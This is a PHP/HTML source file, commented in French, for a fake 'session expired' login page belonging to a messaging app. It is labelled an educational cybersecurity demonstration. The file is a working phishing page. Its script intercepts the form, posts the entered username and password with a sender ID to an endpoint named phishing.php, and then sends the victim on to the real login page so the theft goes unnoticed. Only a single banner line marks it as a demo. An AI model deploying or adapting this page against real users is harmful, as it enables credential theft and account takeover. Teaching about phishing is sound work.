<?php
// Fausse page de connexion - Démonstration éducative
// Cette page imite la vraie page de connexion pour capturer les identifiants

session_start();

// Récupérer l'ID de l'utilisateur qui a envoyé le message
$sender_id = isset($_GET['sender']) ? intval($_GET['sender']) : 0;
?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Page de connexion - Messagerie</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #31a24c 0%, #4db366 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .auth-container {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
            max-width: 400px;
            width: 90%;
        }
        
        .auth-container h1 {
            color: #31a24c;
            margin-bottom: 10px;
            text-align: center;
        }
        
        .text-center {
            text-align: center;
            color: #666;
            margin-bottom: 30px;
            font-size: 14px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: bold;
            font-size: 14px;
        }
        
        .form-group input[type="text"],
        .form-group input[type="password"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
        }
        
        .form-group input[type="text"]:focus,
        .form-group input[type="password"]:focus {
            outline: none;
            border-color: #31a24c;
            box-shadow: 0 0 5px rgba(49, 162, 76, 0.3);
        }
        
        input[type="submit"] {
            width: 100%;
            padding: 10px;
            background: linear-gradient(135deg, #31a24c 0%, #4db366 100%);
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: opacity 0.2s;
        }
        
        input[type="submit"]:hover {
            opacity: 0.9;
        }
        
        .auth-link {
            text-align: center;
            margin-top: 20px;
            color: #666;
            font-size: 14px;
        }
        
        .auth-link a {
            color: #31a24c;
            text-decoration: none;
            font-weight: bold;
        }
        
        .warning {
            background: #fff3cd;
            border: 1px solid #ffc107;
            color: #856404;
            padding: 12px;
            border-radius: 5px;
            margin-bottom: 20px;
            font-size: 12px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="auth-container">
        <h1>Messagerie</h1>
        <p class="text-center">Votre session a expiré. Veuillez vous reconnecter.</p>
        
        <div class="warning">
            ⚠️ Démonstration éducative - Projet de cybersécurité
        </div>
        
        <form id="phishing-form" method="POST">
            <div class="form-group">
                <label for="username">Nom d'utilisateur</label>
                <input type="text" id="username" name="username" required>
            </div>
            
            <div class="form-group">
                <label for="password">Mot de passe</label>
                <input type="password" id="password" name="password" required>
            </div>
            
            <input type="submit" value="Se reconnecter">
        </form>
        
        <div class="auth-link">
            <p>Retourner à la <a href="javascript:history.back()">page précédente</a></p>
        </div>
    </div>
    
    <script>
        // Intercepter la soumission du formulaire
        document.getElementById('phishing-form').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const senderId = <?php echo json_encode($sender_id); ?>;
            
            // Envoyer les identifiants au endpoint
            fetch('/messagerie/codes/fake_login/phishing.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&sender_id=${encodeURIComponent(senderId)}`
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    alert('Reconnexion réussie!');
                    // Rediriger vers la vraie page de connexion
                    window.location.href = '/messagerie/codes/login.php';
                } else {
                    alert('Erreur: ' + (data.message || 'Identifiants incorrects'));
                }
            })
            .catch(error => {
                console.error('Erreur:', error);
                alert('Une erreur s\'est produite.');
            });
        });
    </script>
</body>
</html>
